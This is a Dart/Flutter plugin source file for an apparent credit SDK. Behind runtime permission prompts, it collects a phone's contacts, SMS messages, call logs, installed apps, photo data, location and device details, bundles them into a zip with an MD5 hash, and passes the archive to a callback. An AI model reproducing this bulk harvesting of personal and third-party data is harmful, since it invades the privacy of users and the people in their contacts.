import 'dart:convert';
import 'dart:io';

import 'package:archive/archive_io.dart';
import 'package:crypto/crypto.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:sdk_credit/util/call_util.dart';
import 'package:sdk_credit/util/index.dart';

import 'model/sdk_data_model.dart';
import 'util/logger.dart';

// SDK 成功回调
typedef SdkSuccess = void Function(String path, String md5, String orderNo, bool isSubmit, String json);
// SDK 失败回调
typedef SdkError = void Function(String orderNo, String json, bool isSubmit);
// AF 埋点事件回调
typedef AfEvent = void Function(String eventName);

class SdkPlugin {
  SdkSuccess? sdkSuccess;
  SdkError? sdkError;
  AfEvent? afEvent;
  DateTime? _lastTime;

  SdkPlugin({
    this.sdkSuccess,
    this.sdkError,
    this.afEvent,
  }) {
    _sdkRecordData.clear();
  }

  // 所有权限
  final _allPermission = [
    Permission.phone,
    Permission.location,
    // Permission.contacts,
    Permission.sms,
    // Permission.storage,
  ];

  // 部分权限
  final _allPermission4 = [
    Permission.phone,
    // Permission.contacts,
    Permission.sms,
    // Permission.storage,
  ];

  // 记录线程的状态
  final Map<String, SdkDataModel> _sdkRecordData = {};

  void exec(String value) async {
    // 500毫秒忽略
    final nowTime = DateTime.now();
    if (_lastTime != null && nowTime.difference(_lastTime!).inMilliseconds <= 500) {
      return;
    }

    _lastTime = nowTime;
    SdkDataModel sdkDataModel = SdkDataModel.fromJson(jsonDecode(value));

    // 判断该订单号是否进行中
    if (_sdkRecordData.containsKey(sdkDataModel.data?.orderNo)) {
      // 如果isSubmit = true, 则继续执行
      if (sdkDataModel.data!.isSubmit == true) {
        // 是否需要停掉当前所有的线程
        _runMainLogic(sdkDataModel);
      }
    } else {
      _sdkRecordData[sdkDataModel.data!.orderNo!] = sdkDataModel;
      _runMainLogic(sdkDataModel);
    }
  }

  /// 主逻辑
  void _runMainLogic(SdkDataModel model) async {
    final unPermission = await _checkPermission(_allPermission);
    // 全部授权
    if (unPermission.isEmpty
        // || ((model.data?.isSubmit ?? false) == false && unPermission.length == 1 && unPermission.contains(Permission.location))
    ) {
      _nextCallNative(model);
    } else {
      await _onRequestPermissions(model);
      afEvent?.call('sdk_request_permission');
      _onRequestPermissionsResult(model);
    }
  }

  // 权限请求和提示
  Future<void> _onRequestPermissions(SdkDataModel model) async {
    await _allPermission.request();
    final unPermission = await _checkPermission((model.data?.isSubmit ?? false) ? _allPermission4 : _allPermission);
    if ((model.data?.isSubmit ?? false) && unPermission.isNotEmpty) {
      // 没权限提示
      Fluttertoast.showToast(msg: 'No se pueden obtener permisos, por favor inténtelo de nuevo');
    }
  }

  // 权限检查
  void _onRequestPermissionsResult(SdkDataModel? sdkData) async {
    if (sdkData != null) {
      List<Permission> unPermission = [];
      // 如果isSubmit = true 则只需要4个权限，否则需要所有权限
      if ((sdkData.data?.isSubmit ?? false) == true) {
        unPermission = await _checkPermission(_allPermission4);
      } else {
        unPermission = await _checkPermission(_allPermission);
      }
      if (unPermission.isEmpty) {
        afEvent?.call("sdk_all_permission_get");
        _nextCallNative(sdkData);
      } else {
        afEvent?.call("sdk_permission_denied");
        sdkError?.call(sdkData.data?.orderNo ?? '', jsonEncode(sdkData.toJson()), sdkData.data?.isSubmit ?? false);
        _sdkRecordData.remove(sdkData.data?.orderNo);
        // Toast
      }
    }
  }

// 合并文件
  void _nextCallNative(SdkDataModel model) async {
    afEvent?.call("sdk_next");
    // 获取数据
    await _multiThreadRun(model);

    // afEvent?.call("sdk_next_multiThreadRun");

    // 检查数据
    if ((model.appStr?.isEmpty ?? true) ||
        (model.contactStr?.isEmpty ?? true) ||
        (model.smsStr?.isEmpty ?? true) ||
        (model.locationStr?.isEmpty ?? true) ||
        (model.devicesStr?.isEmpty ?? true) ||
        (model.photoStr?.isEmpty ?? true) ||
        (model.callStr?.isEmpty ?? true)
    ) {
      sdkError?.call(model.data?.orderNo ?? '', jsonEncode(model.toJson()), model.data?.isSubmit ?? false);
      _sdkRecordData.remove(model.data?.orderNo ?? '');
      return;
    }

    try {
      final appDir = await getApplicationSupportDirectory();
      final dir = Directory("${appDir.path}/info");
      if (dir.existsSync()) {
        dir.deleteSync(recursive: true);
        dir.createSync();
      } else {
        dir.createSync();
      }

      final appListFile = File("${dir.path}/1.txt");
      final smsFile = File("${dir.path}/2.txt");
      final devicesFile = File("${dir.path}/3.txt");
      final contactFile = File("${dir.path}/4.txt");
      final photoAlbumFile = File("${dir.path}/5.txt");
      final addressFile = File("${dir.path}/6.txt");
      final callFile = File("${dir.path}/8.txt");

      afEvent?.call("sdk_write_file");

      // 多线程执行, 加快效率
      List<Future> futures = [];
      futures.add(contactFile.writeAsString(model.contactStr ?? ''));
      futures.add(smsFile.writeAsString(model.smsStr ?? ''));
      futures.add(appListFile.writeAsString(model.appStr ?? ''));
      futures.add(photoAlbumFile.writeAsString(model.photoStr ?? ''));
      futures.add(addressFile.writeAsString(model.locationStr ?? ''));
      futures.add(devicesFile.writeAsString(model.devicesStr ?? ''));
      futures.add(callFile.writeAsString(model.callStr ?? ''));
      await Future.wait(futures);

      // 压缩图片文件
      final photoZipFile = await _zip([photoAlbumFile], "${dir.path}/5.zip");
      afEvent?.call("sdk_write_success");
      // photoZipFile.deleteSync();

      afEvent?.call("sdk_zip_file");

      final resultZip = await _zip([
        contactFile,
        smsFile,
        appListFile,
        addressFile,
        devicesFile,
        photoZipFile,
        callFile,
      ], "${appDir.path}/${DateTime.now().millisecondsSinceEpoch}.zip");
      afEvent?.call("sdk_zip_success");
      photoZipFile.deleteSync();
      final resultMd5 = (await md5.bind(resultZip.openRead()).first).toString();

      // 测试的需求
      // final libDir = await getExternalStorageDirectory();
      // File testFile = await resultZip.copy('${libDir!.path}/${DateTime.now().millisecondsSinceEpoch}.zip');

      sdkSuccess?.call(resultZip.path, resultMd5, model.data?.orderNo ?? '', model.data?.isSubmit ?? false, jsonEncode(model));
      _sdkRecordData.remove(model.data?.orderNo ?? '');
    } catch (e) {
      Log().LogE(e.toString());
      sdkError?.call(model.data?.orderNo ?? '', jsonEncode(model.toJson()), model.data?.isSubmit ?? false);
      _sdkRecordData.remove(model.data?.orderNo ?? '');
    }
  }

  // 多线程异步执行(不阻塞线程)，分别获取sdk所需要的信息
  Future<void> _multiThreadRun(SdkDataModel model) async {
    List<Future> futures = [];
    futures.add(InstallUtil().exec(afEvent));
    futures.add(ContactUtil().exec(afEvent));
    futures.add(SmsUtil().exec(afEvent));
    futures.add(DeviceUtil().exec(afEvent));
    futures.add(PhotoUtil().exec(afEvent));
    futures.add(LocationUtil().exec(afEvent, isSubmit: model.data?.isSubmit ?? false));
    futures.add(CallLogUtil().exec(afEvent));
    final result = await Future.wait(futures);
    model.appStr = result[0];
    model.contactStr = result[1];
    model.smsStr = result[2];
    model.devicesStr = result[3];
    model.photoStr = result[4];
    model.locationStr = result[5];
    model.callStr = result[6];
  }

  // 压缩文件
  Future<File> _zip(List<File> targetFiles, String zipPath) async {
    var encoder = ZipFileEncoder();
    encoder.create(zipPath);
    for (var item in targetFiles) {
      encoder.addFile(item);
    }
    encoder.close();
    return File(zipPath);
  }

  // 检测权限
  Future<List<Permission>> _checkPermission(List<Permission> permission) async {
    List<Permission> list = [];
    for (var item in permission) {
      if (!(await item.isGranted)) {
        list.add(item);
      }
    }
    return list;
  }
}
